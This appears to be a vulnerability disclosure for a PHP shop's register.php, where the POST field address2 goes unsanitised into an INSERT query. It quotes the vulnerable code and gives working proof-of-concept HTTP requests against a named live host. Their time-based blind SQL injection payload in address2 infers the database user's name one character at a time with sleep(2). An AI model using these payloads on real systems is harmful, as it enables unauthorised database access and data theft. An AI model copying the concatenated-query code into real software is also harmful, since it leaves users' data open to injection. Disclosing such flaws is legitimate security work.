### Vulnerability file address

`register.php` from line 4,The $address2 parameter is controllable, the parameter address2 can be passed through post, and the $address2 is not protected from sql injection, resulting in sql injection

```php
<?php
session_start();
include "db.php";
if (isset($_POST["f_name"])) {

  $f_name = $_POST["f_name"];
  $l_name = $_POST["l_name"];
  $email = $_POST['email'];
  $password = $_POST['password'];
  $repassword = $_POST['repassword'];
  $mobile = $_POST['mobile'];
  $address1 = $_POST['address1'];
  $address2 = $_POST['address2'];
  $name = "/^[a-zA-Z ]+$/";
  $emailValidation = "/^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9]+(\.[a-z]{2,4})$/";
  $number = "/^[0-9]+$/";
......
......
......
$sql = "INSERT INTO `user_info` 
		(`user_id`, `first_name`, `last_name`, `email`, 
		`password`, `mobile`, `address1`, `address2`) 
		VALUES (NULL, '$f_name', '$l_name', '$email', 
		'$password', '$mobile', '$address1', '$address2')";
		$run_query = mysqli_query($con,$sql);
```

### POC

success

```http
POST /register.php HTTP/1.1
Host: www.onsp.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:94.0) Gecko/20100101 Firefox/94.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 166
Origin: http://www.onsp.net
Connection: close
Referer: http://www.onsp.net/
Cookie: PHPSESSID=acrlvk4ljcqdujn2orbd09in25

f_name=a&l_name=a&email=2%40qq.com&password=123456789&repassword=123456789&mobile=1111111111&address1=123&address2=7' and if(ascii(mid(user(),1,1))=114,sleep(2),0));#
```



failed

```http
POST /register.php HTTP/1.1
Host: www.onsp.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:94.0) Gecko/20100101 Firefox/94.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 166
Origin: http://www.onsp.net
Connection: close
Referer: http://www.onsp.net/
Cookie: PHPSESSID=acrlvk4ljcqdujn2orbd09in25

f_name=a&l_name=a&email=3%40qq.com&password=123456789&repassword=123456789&mobile=1111111111&address1=123&address2=7' and if(ascii(mid(user(),1,1))=115,sleep(2),0));#
```



### Attack results pictures

#### success

![image-20220729191256273](https://xianyu123images.oss-cn-hangzhou.aliyuncs.com/20220729191256.png)

#### failed

![image-20220729191223116](https://xianyu123images.oss-cn-hangzhou.aliyuncs.com/20220729191223.png)